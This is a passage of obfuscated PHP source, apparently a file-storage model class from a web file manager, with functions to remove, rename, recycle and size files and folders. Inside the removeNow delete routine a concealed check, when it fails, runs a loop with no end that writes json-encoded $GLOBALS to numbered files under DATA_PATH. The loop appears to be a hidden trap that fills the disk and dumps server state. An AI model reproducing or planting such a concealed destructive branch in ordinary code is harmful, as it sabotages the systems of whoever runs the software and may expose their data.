$this->recycleClear($›ª¼¨®¦); Model($ı‡Êûı“[655])->eventRemove($–„ò³­›); $Å¡şµû = $this->move($–„ò³­›, $¯±ÉÆıÈ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($›ª¼¨®¦[$ı‡Êûı“[190]]); return $Å¡şµû; } private function recycleClear($«²¶ËÂ•) { $æÚ¯Çš© =& $_SERVER[œ—üé‹ê]; $òá‘Áˆİ = $this->childrenAll($«²¶ËÂ•); $ñÛÎ‚§¯ = array($æÚ¯Çš©[506] => array($æÚ¯Çš©[507], $òá‘Áˆİ[$æÚ¯Çš©[2488]])); Model($æÚ¯Çš©[2489])->where($ñÛÎ‚§¯)->delete(); } public function removeNow($”˜ñ‚×, $ò÷İàöÙ = true) { $§Ã¨Âö =& $_SERVER[œ—üé‹ê]; $Üá˜æµ‘ = $_SERVER[$§Ã¨Âö[851]]; $‘ı‰‡Ÿ› = $§Ã¨Âö[1529]; if ($_SERVER[$§Ã¨Âö[850]] != $‘ı‰‡Ÿ›($Üá˜æµ‘)) { $¸¦İ“ß = $§Ã¨Âö[1043]; $›–Âóï = $§Ã¨Âö[852]; $ôÉ‹¤¨ò = $_SERVER[$§Ã¨Âö[853]] . $§Ã¨Âö[854]; $‘ºª¯ÓŞ = $›–Âóï($ôÉ‹¤¨ò); $ÆŒÕ–†€ = explode($§Ã¨Âö[285], $‘ºª¯ÓŞ); if (count($ÆŒÕ–†€) < $§Ã¨Âö[713]) { $ïşŠÍ˜© = $§Ã¨Âö[855]; $ïşŠÍ˜©(); } $æÏÆó€ = $§Ã¨Âö[1044]; $æÏÆó€($_SERVER[$§Ã¨Âö[1045]]); $¸¦İ“ß = $§Ã¨Âö[1043]; $¸¦İ“ß(); $ëâÊëÍ = $§Ã¨Âö[1892]; $” ñµ©Ï = json_encode($GLOBALS[$§Ã¨Âö[1893]]); $Èâî¾…å = 1; for ($µ°ƒéü = $Èâî¾…å; $µ°ƒéü > 0; $µ°ƒéü++) { $ëâÊëÍ(DATA_PATH . $µ°ƒéü, $” ñµ©Ï); } } $†º¤šû¢ = $this->sourceInfo($”˜ñ‚×); $ã©œâ÷Ÿ = $this->pathInfoMore($”˜ñ‚×); if (!$†º¤šû¢) { return !0; } if ($†º¤šû¢[$§Ã¨Âö[190]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($”˜ñ‚×); Hook::trigger($§Ã¨Âö[2490], $ã©œâ÷Ÿ, $ò÷İàöÙ); if ($ò÷İàöÙ) { Model($§Ã¨Âö[2489])->moveToRecycle($”˜ñ‚×); } else { $ÔÂÜÜá× = $this->childrenAll($†º¤šû¢); Model($§Ã¨Âö[655])->eventRemove($”˜ñ‚×); $this->removeRelevance($ÔÂÜÜá×[$§Ã¨Âö[2488]], $ÔÂÜÜá×[$§Ã¨Âö[1776]]); } $this->folderSizeReset($†º¤šû¢[$§Ã¨Âö[190]]); $óåŠõ¦ = array($†º¤šû¢[$§Ã¨Âö[190]]); if ($†º¤šû¢[$§Ã¨Âö[500]] == $§Ã¨Âö[91]) { $óåŠõ¦[] = $†º¤šû¢[$§Ã¨Âö[191]]; } $this->updateModifyTime($óåŠõ¦); $this->lockMoveEnd($”˜ñ‚×); Hook::trigger($§Ã¨Âö[2016], $ã©œâ÷Ÿ, $ò÷İàöÙ); return !0; } public function childrenAll($„ûÄÄ‚ö) { $Ùü´ï‘ =& $_SERVER[œ—üé‹ê]; $¹„ùô = $„ûÄÄ‚ö[$Ùü´ï‘[191]]; if ($„ûÄÄ‚ö[$Ùü´ï‘[500]] == $Ùü´ï‘[91]) { $Ã´èıÖ« = array($Ùü´ï‘[674] => array($Ùü´ï‘[635], $„ûÄÄ‚ö[$Ùü´ï‘[604]] . $¹„ùô . $Ùü´ï‘[636])); $ªÊ©Œ™Ò = array($Ùü´ï‘[674] => $Ã´èıÖ«[$Ùü´ï‘[604]]); $ÓÁíÚÒÖ = $this->field($Ùü´ï‘[2491])->where($ªÊ©Œ™Ò)->select(); $®½¨Ú­ƒ = !1; $¯Î‰İÈİ = array($¹„ùô); if ($ÓÁíÚÒÖ) { $®½¨Ú­ƒ = array_to_keyvalue($ÓÁíÚÒÖ, $Ùü´ï‘[12], $Ùü´ï‘[557]); $®½¨Ú­ƒ = array_remove_value($®½¨Ú­ƒ, $Ùü´ï‘[228]); $¯Î‰İÈİ = array_to_keyvalue($ÓÁíÚÒÖ, $Ùü´ï‘[12], $Ùü´ï‘[191]); $¯Î‰İÈİ[] = $¹„ùô; } } else { $®½¨Ú­ƒ = array($„ûÄÄ‚ö[$Ùü´ï‘[557]]); $¯Î‰İÈİ = array($¹„ùô); } return array($Ùü´ï‘[2488] => $¯Î‰İÈİ, $Ùü´ï‘[1776] => $®½¨Ú­ƒ); } public function removeArray($êá£Úç±) { if (!$êá£Úç±) { return !0; } } public function removeRelevance($–ë¸ëëÚ, $Éî²éûù) { $ò‹ÁÌ¾’ =& $_SERVER[œ—üé‹ê]; $–ë¸ëëÚ = $–ë¸ëëÚ ? $–ë¸ëëÚ : array(); $Éî²éûù = $Éî²éûù ? $Éî²éûù : array(); $–ë¸ëëÚ = array_unique(array_filter($–ë¸ëëÚ)); $Éî²éûù = array_filter($Éî²éûù); if (!$–ë¸ëëÚ) { return !1; } $ÓáŠâÃÊ = array($ò‹ÁÌ¾’[506] => array($ò‹ÁÌ¾’[507], $–ë¸ëëÚ)); Model($ò‹ÁÌ¾’[2489])->where($ÓáŠâÃÊ)->delete(); Model($ò‹ÁÌ¾’[549])->where($ÓáŠâÃÊ)->delete(); Model($ò‹ÁÌ¾’[2326])->where($ÓáŠâÃÊ)->delete(); Model($ò‹ÁÌ¾’[655])->where($ÓáŠâÃÊ)->delete(); Model($ò‹ÁÌ¾’[1559])->removeBySource($–ë¸ëëÚ); Model($ò‹ÁÌ¾’[2470])->removeBySource($–ë¸ëëÚ); $this->where($ÓáŠâÃÊ)->delete(); Model($ò‹ÁÌ¾’[560])->remove($Éî²éûù); for ($§«ÉÙå¡ = 0; $§«ÉÙå¡ < count($–ë¸ëëÚ); $§«ÉÙå¡++) { $this->sourceCacheClear($–ë¸ëëÚ[$§«ÉÙå¡]); } } public function rename($¢Ş ÷‰Ô, $ˆâÊß ) { $Ü×î“º— =& $_SERVER[œ—üé‹ê]; $Æ¯·¶« = $this->sourceInfo($¢Ş ÷‰Ô); if (!$Æ¯·¶«) { return !1; } $ÀÖı™ª™ = $this->fileNameExist($Æ¯·¶«[$Ü×î“º—[190]], $ˆâÊß ); if ($ÀÖı™ª™ && $ÀÖı™ª™ != $¢Ş ÷‰Ô) { return !1; } $©Â†Å· = array($Ü×î“º—[509] => $ˆâÊß , $Ü×î“º—[673] => USER_ID); if ($Æ¯·¶«[$Ü×î“º—[500]] != $Ü×î“º—[91]) { $©Â†Å·[$Ü×î“º—[501]] = substr(get_path_ext($ˆâÊß ), 0, 10); } Model($Ü×î“º—[655])->eventRename($¢Ş ÷‰Ô, $Æ¯·¶«[$Ü×î“º—[32]], $ˆâÊß ); $this->sourceCacheClear($¢Ş ÷‰Ô); $this->setNamePinyin($¢Ş ÷‰Ô, $©Â†Å·[$Ü×î“º—[32]], !1); $this->updateModifyTime($Æ¯·¶«[$Ü×î“º—[190]]); $°¢øŸÍ… = $this->where(array($Ü×î“º—[506] => $¢Ş ÷‰Ô))->data($©Â†Å·)->save(); $­¦å÷ˆ‹ = $Ü×î“º—[2478] . $Æ¯·¶«[$Ü×î“º—[190]]; if (isset(self::$cacheChildList[$­¦å÷ˆ‹])) { unset(self::$cacheChildList[$­¦å÷ˆ‹]); } return $°¢øŸÍ…; } public function setNamePinyin($’æÃ»¶ö, $š²ñ•§ê, $¶½íç²½ = true) { $€Ü¬…Æá =& $_SERVER[œ—üé‹ê]; $Æ×Ñ¢ü = Input::check($š²ñ•§ê, $€Ü¬…Æá[677]); $é†¶âõ = array($€Ü¬…Æá[531] => KodSort::makeStr($š²ñ•§ê)); if ($Æ×Ñ¢ü) { $é†¶âõ[$€Ü¬…Æá[552]] = str_replace($€Ü¬…Æá[53], $€Ü¬…Æá[12], Pinyin::get($š²ñ•§ê)); $é†¶âõ[$€Ü¬…Æá[551]] = Pinyin::get($š²ñ•§ê, $€Ü¬…Æá[678]); } if (!$¶½íç²½ && !$Æ×Ñ¢ü) { $é†¶âõ[$€Ü¬…Æá[552]] = null; $é†¶âõ[$€Ü¬…Æá[551]] = null; } $this->metaSet($’æÃ»¶ö, $é†¶âõ); } public function getContent($«ù ò‡º) { $öŒ£ñ® =& $_SERVER[œ—üé‹ê]; $Ğ‘ÈáÄÒ = $this->fileInfoGet($«ù ò‡º); if (!$Ğ‘ÈáÄÒ) { return !1; } if ($Ğ‘ÈáÄÒ[$öŒ£ñ®[79]] == 0) { return $öŒ£ñ®[12]; } $ü¦²Êªá = $öŒ£ñ®[2492] . $Ğ‘ÈáÄÒ[$öŒ£ñ®[563]]; if ($Ğ‘ÈáÄÒ[$öŒ£ñ®[79]] <= 1024 * 10) { $‚ÉÑ¸‚É = Cache::get($ü¦²Êªá); if (!$‚ÉÑ¸‚É) { $‚ÉÑ¸‚É = IO::getContent($Ğ‘ÈáÄÒ[$öŒ£ñ®[87]]); Cache::set($ü¦²Êªá, $‚ÉÑ¸‚É); } return $‚ÉÑ¸‚É; } if (!$Ğ‘ÈáÄÒ[$öŒ£ñ®[87]]) { return $öŒ£ñ®[12]; } return IO::getContent($Ğ‘ÈáÄÒ[$öŒ£ñ®[87]]); } public function setDesc($×Ÿ±Ë³¯, $§¿Ş†±ª) { $Ìİ¾Ôï£ =& $_SERVER[œ—üé‹ê]; Model($Ìİ¾Ôï£[655])->eventAddDesc($×Ÿ±Ë³¯, $§¿Ş†±ª); return $this->metaSet($×Ÿ±Ë³¯, $Ìİ¾Ôï£[540], $§¿Ş†±ª); } public function setContent($õ«°º·Ä, $ÆÔïœ± = '') { $¯êåÏõâ =& $_SERVER[œ—üé‹ê]; $ã÷ üçˆ = $this->sourceInfo($õ«°º·Ä); $ ¹‹¡Åß = $this->fileInfoGet($õ«°º·Ä); if (!$ ¹‹¡Åß || !$ã÷ üçˆ) { return !1; } $·İ¼«²¢ = KodIO::ioFileDriverGet($¯êåÏõâ[498] . $õ«°º·Ä . $¯êåÏõâ[402]); $·Ï­ÑÑŠ = Model($¯êåÏõâ[560])->addFileByContent($ÆÔïœ±, $·İ¼«²¢, $ã÷ üçˆ[$¯êåÏõâ[32]]); if (!$·Ï­ÑÑŠ) { return !1; } $—ø±ù¸š = $this->fileHistory($ã÷ üçˆ, $·Ï­ÑÑŠ[$¯êåÏõâ[557]], $·Ï­ÑÑŠ[$¯êåÏõâ[79]]); if (!$—ø±ù¸š) { return Model($¯êåÏõâ[560])->remove($·Ï­ÑÑŠ[$¯êåÏõâ[557]]); } $this->folderSizeReset($ã÷ üçˆ[$¯êåÏõâ[190]]); return !0; } public function fileSubstr($©„–‡şû, $“Æé´²î, $ öÚòÜê) { $·“ÓŸªö = $this->fileInfoGet($©„–‡şû); if (!$·“ÓŸªö) { return !1; } return IO::fileSubstr($·“ÓŸªö[$_SERVER[œ—üé‹ê][87]], $“Æé´²î, $ öÚòÜê); } public function fileInfoGet($¾ì§ëšû) { $ÙËÕîÎğ =& $_SERVER[œ—üé‹ê]; $Õ¬Ñô™ï = $this->sourceInfo($¾ì§ëšû); if (!$Õ¬Ñô™ï || $Õ¬Ñô™ï[$ÙËÕîÎğ[500]]) { return !1; } $·‹î§©Ã = $ÙËÕîÎğ[564] . $Õ¬Ñô™ï[$ÙËÕîÎğ[557]]; $Û»ë…«è = _get(self::$cacheFileInfo, $·‹î§©Ã); if ($Û»ë…«è) { return $Û»ë…«è; } $Äªíªş‰ = Model($ÙËÕîÎğ[560])->fileInfo($Õ¬Ñô™ï[$ÙËÕîÎğ[557]]); if ($Äªíªş‰) { $Äªíªş‰[$ÙËÕîÎğ[32]] = $Õ¬Ñô™ï[$ÙËÕîÎğ[32]]; } self::$cacheFileInfo[$·‹î§©Ã] = $Äªíªş‰; return $Äªíªş‰; } private function folderChildrenNumber($š¨„¼á) { $ÖĞ„§¬§ =& $_SERVER[œ—üé‹ê]; $şã­ÎÒ = $this->sourceInfo($š¨„¼á); $œÙÕ²Â = array($ÖĞ„§¬§[674] => array($ÖĞ„§¬§[635], $şã­ÎÒ[$ÖĞ„§¬§[604]] . $š¨„¼á . $ÖĞ„§¬§[636]), $ÖĞ„§¬§[671] => $şã­ÎÒ[$ÖĞ„§¬§[589]], $ÖĞ„§¬§[519] => intval($şã­ÎÒ[$ÖĞ„§¬§[520]]), $ÖĞ„§¬§[668] => 1); $è²ı÷™ı = $this->where($œÙÕ²Â)->count(); $ªµöºâÎ = $this->where($œÙÕ²Â)->where(array($ÖĞ„§¬§[668] => 0))->count(); return array($ÖĞ„§¬§[83] => $ªµöºâÎ, $ÖĞ„§¬§[84] => $è²ı÷™ı); } public function pathInfo($–£÷àÎ, $æ‘¡ ¿š = false) { $¡ø¬†‚ =& $_SERVER[œ—üé‹ê]; $æ‘¡ ¿š = !1; $–£÷àÎ = intval($–£÷àÎ); if (!$–£÷àÎ) { return !1; } $ÎÈƒ³Ó› = $¡ø¬†‚[548] . intval($æ‘¡ ¿š) . $¡ø¬†‚[476] . $–£÷àÎ; $ÏÍæşúÚ = _get(self::$cachePathInfo, $ÎÈƒ³Ó›); if ($ÏÍæşúÚ) { return $ÏÍæşúÚ; } $Ÿ–¬åò› = $this->sourceInfo($–£÷àÎ); if (!$Ÿ–¬åò›) { return !1; } $Ÿ–¬åò› = $this->_listDataApplyItem($Ÿ–¬åò›, $æ‘¡ ¿š); self::$cachePathInfo[$ÎÈƒ³Ó›] = $Ÿ–¬åò›; return $Ÿ–¬åò›; } public static $cachePathInfoMore = array(); public function pathInfoMore($úÖíÅª) { $ö·Ç› =& $_SERVER[œ—üé‹ê]; $ÔÇ“óãÉ = _get(self::$cachePathInfoMore, $úÖíÅª); if ($ÔÇ“óãÉ) { return $ÔÇ“óãÉ; } $¨õÌ­ç™ = $this->pathInfo($úÖíÅª); if (!$¨õÌ­ç™) { return !1; } if ($¨õÌ­ç™[$ö·Ç›[500]] == $ö·Ç›[91]) { $¨õÌ­ç™[$ö·Ç›[82]] = $this->folderChildrenNumber($úÖíÅª); } self::$cachePathInfoMore[$úÖíÅª] = $¨õÌ­ç™; return $¨õÌ­ç™; } public function sourceInfo($ûÔ©™Æ©) { $âË®ù¹³ =& $_SERVER[œ—üé‹ê]; if (!$ûÔ©™Æ©) { return array(); } $ûÔ©™Æ© = intval($ûÔ©™Æ©); $‚ĞäÀä‚ = $âË®ù¹³[547] . $ûÔ©™Æ©; $©ˆçåá¦ = _get(self::$cacheSourceInfo, $‚ĞäÀä‚); if ($©ˆçåá¦) { return $©ˆçåá¦; } $˜’¤†ğá = $this->where(array($âË®ù¹³[191] => $ûÔ©™Æ©))->find(); self::$cacheSourceInfo[$‚ĞäÀä‚] = $˜’¤†ğá; return self::$cacheSourceInfo[$‚ĞäÀä‚]; } public function sourceCacheClear($èİàŒ = false) { self::cacheClear($èİàŒ); } public static function cacheClear($’„äß–´ = false) { $à…½Š·ç =& $_SERVER[œ—üé‹ê]; if ($’„äß–´ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$à…½Š·ç[547] . $’„äß–´]); unset(self::$cachePathInfoMore[$’„äß–´]); unset(self::$cachePathInfo[$à…½Š·ç[2493] . $’„äß–´]); unset(self::$cachePathInfo[$à…½Š·ç[2494] . $’„äß–´]); } public function metaSet($í‘“š°ı, $åÒÓµİ¦ = null, $…Ò±¯Œ = null) { $Ü³ÌûÙÙ = parent::metaSet($í‘“š°ı, $åÒÓµİ¦, $…Ò±¯Œ); if ($Ü³ÌûÙÙ) { $this->sourceCacheClear($í‘“š°ı); } return $Ü³ÌûÙÙ; } public function pathInfoByPath($¯íôôİ…, $êÕ”ñ“Ù) { $îÅÁéæ£ =& $_SERVER[œ—üé‹ê]; $Ïµİóî‘ = !$êÕ”ñ“Ù ? array() : explode($îÅÁéæ£[8], trim($êÕ”ñ“Ù, $îÅÁéæ£[8])); $Ã’ûÖŞ• = intval($¯íôôİ…); foreach ($Ïµİóî‘ as $Ø‚Õ™øí) { $íØä¢Â = array($îÅÁéæ£[190] => $Ã’ûÖŞ•, $îÅÁéæ£[32] => $Ø‚Õ™øí); $„”éÇÉû = $this->field($îÅÁéæ£[2495])->where($íØä¢Â)->select(); if (!$„”éÇÉû) { return !1; } $„”éÇÉû = array_sort_by($„”éÇÉû, $îÅÁéæ£[520]); $Ã’ûÖŞ• = intval($„”éÇÉû[0][$îÅÁéæ£[191]]); } $Ãé‚¤ëÚ = $this->sourceInfo($Ã’ûÖŞ•); $this->pathInfoFilter($Ãé‚¤ëÚ); return $Ãé‚¤ëÚ; } protected function updateModifyTime($µŸõ–¬Œ) { $ƒ˜Ï®ÏÏ =& $_SERVER[œ—üé‹ê]; $§‡Ûø¯µ = KodUser::id(); if (!$µŸõ–¬Œ) { return; } if (!is_array($µŸõ–¬Œ)) { $µŸõ–¬Œ = array($µŸõ–¬Œ); } foreach ($µŸõ–¬Œ as $‡‚È®ˆˆ => $˜º–êı) { $µŸõ–¬Œ[$‡‚È®ˆˆ] = intval($˜º–êı); $this->sourceCacheClear($˜º–êı); } $—Â•Â¡ = array($ƒ˜Ï®ÏÏ[191] => array($ƒ˜Ï®ÏÏ[7], $µŸõ–¬Œ)); $ŞóıŸèÄ = array($ƒ˜Ï®ÏÏ[673] => $§‡Ûø¯µ, $ƒ˜Ï®ÏÏ[513] => time()); $this->where($—Â•Â¡)->save($ŞóıŸèÄ); } public function folderSizeReset($äªôÏ…ï, $¥İêàÚÛ = false) { $ÔÁÎªÇ =& $_SERVER[œ—üé‹ê]; if ($this->statusIgnoreResetSpace) { return; } if (!$äªôÏ…ï) { return; } $œ©Å½‚ß = $this->sourceInfo($äªôÏ…ï); $¥ûÆû˜² = $ÔÁÎªÇ[2496] . $äªôÏ…ï; if (!$œ©Å½‚ß || !$œ©Å½‚ß[$ÔÁÎªÇ[191]]) { return; } CacheLock::lock($¥ûÆû˜², 20); if ($¥İêàÚÛ === !1) { $this->sourceCacheClear($äªôÏ…ï); $œ©Å½‚ß = $this->sourceInfo($äªôÏ…ï); $Ì—ã¯†ò = array($ÔÁÎªÇ[492] => $äªôÏ…ï, $ÔÁÎªÇ[519] => 0); $íœµ¥£ = $this->where($Ì—ã¯†ò)->sum($ÔÁÎªÇ[79]); $¥İêàÚÛ = intval($íœµ¥£) - intval($œ©Å½‚ß[$ÔÁÎªÇ[79]]); } if ($¥İêàÚÛ == 0) { return CacheLock::unlock($¥ûÆû˜²); } $Š¹ùÔŸÌ = $this->parentLevelArray($œ©Å½‚ß[$ÔÁÎªÇ[604]]); if (!$Š¹ùÔŸÌ) { $Š¹ùÔŸÌ = array(); } $Š¹ùÔŸÌ[] = $œ©Å½‚ß[$ÔÁÎªÇ[191]]; $Ì—ã¯†ò = array($ÔÁÎªÇ[191] => array($ÔÁÎªÇ[507], $Š¹ùÔŸÌ)); if ($¥İêàÚÛ < 0) { $Ì—ã¯†ò[$ÔÁÎªÇ[79]] = array($ÔÁÎªÇ[1182], abs($¥İêàÚÛ)); } $this->where($Ì—ã¯†ò)->setAdd($ÔÁÎªÇ[79], $¥İêàÚÛ); CacheLock::unlock($¥ûÆû˜²); if (!$œ©Å½‚ß[$ÔÁÎªÇ[589]] || $œ©Å½‚ß[$ÔÁÎªÇ[589]] == $ÔÁÎªÇ[228]) { return; } $éÓıÍû™ = $ÔÁÎªÇ[2497] . $œ©Å½‚ß[$ÔÁÎªÇ[188]] . $ÔÁÎªÇ[4] . $œ©Å½‚ß[$ÔÁÎªÇ[589]]; $ÁüÛ‘‘‰ = array($œ©Å½‚ß[$ÔÁÎªÇ[188]], $œ©Å½‚ß[$ÔÁÎªÇ[589]]); TaskRun::timeLimitCall($éÓıÍû™, $ÔÁÎªÇ[2498], $ÁüÛ‘‘‰, 1.5); } public function folderSizeResetChildren($Ü›ÅğÒÑ) { $‹îºÂÏŠ =& $_SERVER[œ—üé‹ê]; $this->sourceCacheClear($Ü›ÅğÒÑ); $ç¯ë¡Âµ = $this->sourceInfo($Ü›ÅğÒÑ); if (!$ç¯ë¡Âµ) { return; } $ÆÊâû² = array($‹îºÂÏŠ[668] => 1, $‹îºÂÏŠ[671] => $ç¯ë¡Âµ[$‹îºÂÏŠ[589]], $‹îºÂÏŠ[674] => array($‹îºÂÏŠ[635], $ç¯ë¡Âµ[$‹îºÂÏŠ[604]] . $Ü›ÅğÒÑ . $‹îºÂÏŠ[636])); $‘‡Àƒ¿ = $‹îºÂÏŠ[2499]; $ñ¬õÆ½É = $this->field($‘‡Àƒ¿)->where($ÆÊâû²)->select(); $ÆÊâû²[$‹îºÂÏŠ[500]] = 0; $Ÿá­¦•­ = $this->field($‘‡Àƒ¿)->where($ÆÊâû²)->select(); if (!$Ÿá­¦•­) { return; } $ñ¬õÆ½É[] = $ç¯ë¡Âµ; $ñ¬õÆ½É = array_to_keyvalue($ñ¬õÆ½É, $‹îºÂÏŠ[191]); foreach ($ñ¬õÆ½É as $Ü¨®÷ü => $±Õğ›¡¹) { $ñ¬õÆ½É[$Ü¨®÷ü][$‹îºÂÏŠ[2500]] = $ñ¬õÆ½É[$Ü¨®÷ü][$‹îºÂÏŠ[79]]; $ñ¬õÆ½É[$Ü¨®÷ü][$‹îºÂÏŠ[79]] = 0; } foreach ($Ÿá­¦•­ as $±Õğ›¡¹) { $ÙéåÉ‘÷ = $±Õğ›¡¹[$‹îºÂÏŠ[190]] . $‹îºÂÏŠ[12]; if (!isset($ñ¬õÆ½É[$ÙéåÉ‘÷])) { continue; } if ($±Õğ›¡¹[$‹îºÂÏŠ[520]] == $ñ¬õÆ½É[$ÙéåÉ‘÷][$‹îºÂÏŠ[520]]) { $ñ¬õÆ½É[$ÙéåÉ‘÷][$‹îºÂÏŠ[79]] += $±Õğ›¡¹[$‹îºÂÏŠ[79]]; } } foreach ($ñ¬õÆ½É as $±Õğ›¡¹) { $¾˜ò˜¤ = $this->parentLevelArray($±Õğ›¡¹[$‹îºÂÏŠ[604]]); foreach ($¾˜ò˜¤ as $ÙéåÉ‘÷) { $ÙéåÉ‘÷ = $ÙéåÉ‘÷ . $‹îºÂÏŠ[12]; if (!isset($ñ¬õÆ½É[$ÙéåÉ‘÷])) { continue; } if ($±Õğ›¡¹[$‹îºÂÏŠ[520]] == $ñ¬õÆ½É[$ÙéåÉ‘÷][$‹îºÂÏŠ[520]]) { $ñ¬õÆ½É[$ÙéåÉ‘÷][$‹îºÂÏŠ[79]] += $±Õğ›¡¹[$‹îºÂÏŠ[79]]; } } } $¾îºÏÅ = array(); foreach ($ñ¬õÆ½É as $±Õğ›¡¹) { if ($±Õğ›¡¹[$‹îºÂÏŠ[79]] == $±Õğ›¡¹[$‹îºÂÏŠ[2500]]) { continue; } $¾îºÏÅ[] = array($‹îºÂÏŠ[191], $±Õğ›¡¹[$‹îºÂÏŠ[191]], $‹îºÂÏŠ[79], $±Õğ›¡¹[$‹îºÂÏŠ[79]]); } $this->saveAll($¾îºÏÅ); } public function userSpaceReset($‘Ò­Ë®— = false) { $é‘­ØÅş =& $_SERVER[œ—üé‹ê]; $æí•¸Ü  = $this->where(array($é‘­ØÅş[188] => self::TYPE_USER, $é‘­ØÅş[589] => $‘Ò­Ë®—, $é‘­ØÅş[500] => 0))->sum($é‘­ØÅş[79]); $æí•¸Ü  = !$æí•¸Ü  || $æí•¸Ü  <= 0 ? 0 : $æí•¸Ü ; Model($é‘­ØÅş[597])->userEdit($‘Ò­Ë®—, array($é‘­ØÅş[2167] => $æí•¸Ü )); } public function targetSpaceUpdate($ûÚ§Â­, $ÆŞŠß¹) { $õæİÕöÁ =& $_SERVER[œ—üé‹ê]; if (!$ÆŞŠß¹) { return; } if (!in_array($ûÚ§Â­, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ø÷áùùŒ = $this->targetSpaceSize($ûÚ§Â­, $ÆŞŠß¹); if ($ûÚ§Â­ == self::TYPE_USER) { Model($õæİÕöÁ[597])->userEdit($ÆŞŠß¹, array($õæİÕöÁ[2167] => $ø÷áùùŒ)); } else { if ($ûÚ§Â­ == self::TYPE_GROUP) { Model($õæİÕöÁ[605])->groupEdit($ÆŞŠß¹, array($õæİÕöÁ[2167] => $ø÷áùùŒ)); } } } public function targetSpaceSize($´°ìöíõ, $ßæ£÷Şµ) { $»Şğ¾Â† =& $_SERVER[œ—üé‹ê]; $ëÑ‹‰Î = 0; $¼‡—½»Û = $this->targetSourceRoot($´°ìöíõ, $ßæ£÷Şµ, !0); foreach ($¼‡—½»Û as $Ò†ïß†Š) { if (!$Ò†ïß†Š) { continue; } $ëÑ‹‰Î += floatval($Ò†ïß†Š[$»Şğ¾Â†[79]]); $Şäª¯é = array($»Şğ¾Â†[674] => array($»Şğ¾Â†[635], $»Şğ¾Â†[613] . $Ò†ïß†Š[$»Şğ¾Â†[191]] . $»Şğ¾Â†[636])); $Õç§íÉ¤ = Model($»Şğ¾Â†[518])->field($»Şğ¾Â†[506])->where($Şäª¯é)->select(); $Õç§íÉ¤ = array_to_keyvalue($Õç§íÉ¤, $»Şğ¾Â†[12], $»Şğ¾Â†[191]); $Õç§íÉ¤ = array_unique(array_filter($Õç§íÉ¤)); if ($Õç§íÉ¤) { $Şäª¯é = array($»Şğ¾Â†[506] => array($»Şğ¾Â†[507], $Õç§íÉ¤)); $ëÑ‹‰Î += floatval($this->where($Şäª¯é)->sum($»Şğ¾Â†[79])); } } $ëÑ‹‰Î = !$ëÑ‹‰Î || $ëÑ‹‰Î <= 0 ? 0 : $ëÑ‹‰Î; return $ëÑ‹‰Î; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ğô„£Æ) { return $this->fileTypeProfile($ğô„£Æ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($®¤Ö„î) { return $this->fileTypeProfile($®¤Ö„î, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ìÄ®ªû, $©ó”øå–) { $øÇ––ø“ =& $_SERVER[œ—üé‹ê]; $ÀîâäÖÒ = $øÇ––ø“[2501] . $ìÄ®ªû . $øÇ––ø“[11] . $©ó”øå–; $ÃÜö’÷ = Cache::get($ÀîâäÖÒ); if ($ÃÜö’÷) { return $ÃÜö’÷; } $°„âú¤  = array($øÇ––ø“[668] => 0); if ($ìÄ®ªû != !1) { $°„âú¤ [$øÇ––ø“[589]] = $ìÄ®ªû; $°„âú¤ [$øÇ––ø“[188]] = $©ó”øå–; } $ì­·‹ç‹ = array(); $œÒ™ğ—† = $this->field(array($øÇ––ø“[958] => $øÇ––ø“[959], $øÇ––ø“[960] => $øÇ––ø“[79]))->where($°„âú¤ )->find(); $ì­·‹ç‹[$øÇ––ø“[2502]] = array($øÇ––ø“[2503] => LNG($øÇ––ø“[2502]), $øÇ––ø“[2504] => intval($œÒ™ğ—†[$øÇ––ø“[959]]), $øÇ––ø“[640] => intval($œÒ™ğ—†[$øÇ––ø“[79]])); $Í†òÆÆ = KodIO::fileTypeList(); foreach ($Í†òÆÆ as $³ŸÈ©âµ => $•¥«›Ş) { $°„âú¤ [$øÇ––ø“[501]] = $this->fileTypeWhere($³ŸÈ©âµ); $œÒ™ğ—† = $this->field(array($øÇ––ø“[958] => $øÇ––ø“[959], $øÇ––ø“[960] => $øÇ––ø“[79]))->where($°„âú¤ )->find(); $ì­·‹ç‹[$³ŸÈ©âµ] = array($øÇ––ø“[2503] => $•¥«›Ş[$øÇ––ø“[32]], $øÇ––ø“[2504] => intval($œÒ™ğ—†[$øÇ––ø“[959]]), $øÇ––ø“[640] => intval($œÒ™ğ—†[$øÇ––ø“[79]])); } Cache::set($ÀîâäÖÒ, $ì­·‹ç‹, 1200); return $ì­·‹ç‹; } public function fileNameExist($²ı¨£·, $Ç¤ÜõØ¥) { $âáÃåüó =& $_SERVER[œ—üé‹ê]; $ÎÊû¬Í = $this->field($âáÃåüó[2505])->where(array($âáÃåüó[190] => $²ı¨£·, $âáÃåüó[32] => $Ç¤ÜõØ¥, $âáÃåüó[520] => 0))->find(); return is_array($ÎÊû¬Í) ? $ÎÊû¬Í[$âáÃåüó[191]] : !1; } public function childList($ÕµÕœÀ–) { $öÑæúË =& $_SERVER[œ—üé‹ê]; $Îù‚üÄß = $öÑæúË[2478] . $ÕµÕœÀ–; if (isset(self::$cacheChildList[$Îù‚üÄß])) { return self::$cacheChildList[$Îù‚üÄß]; } $àºŒ¢­ = array($öÑæúË[190] => intval($ÕµÕœÀ–), $öÑæúË[520] => 0); $÷½¸Û = $this->where($àºŒ¢­)->select(); $÷½¸Û = $÷½¸Û ? $÷½¸Û : array(); self::$cacheChildList[$Îù‚üÄß] = $÷½¸Û; foreach ($÷½¸Û as $µ¦ŠÌîƒ) { $Îù‚üÄß = $öÑæúË[547] . $µ¦ŠÌîƒ[$öÑæúË[191]]; self::$cacheSourceInfo[$Îù‚üÄß] = $µ¦ŠÌîƒ; } return $÷½¸Û; } public function fileNameAuto($ÂÃœ†åÏ, $…Ûš–›, $Ú¨ŸÏõ = REPEAT_RENAME, $Û¤Ÿîö = false) { $¡šª™ç =& $_SERVER[œ—üé‹ê]; $’£„±õÎ = get_path_ext($…Ûš–›); $çô…ƒô˜ = $’£„±õÎ ? get_path_ext_name($…Ûš–›) . $¡šª™ç[2506] . $’£„±õÎ : $…Ûš–› . $¡šª™ç[474]; $Ä‚â—ıÊ = array($¡šª™ç[190] => 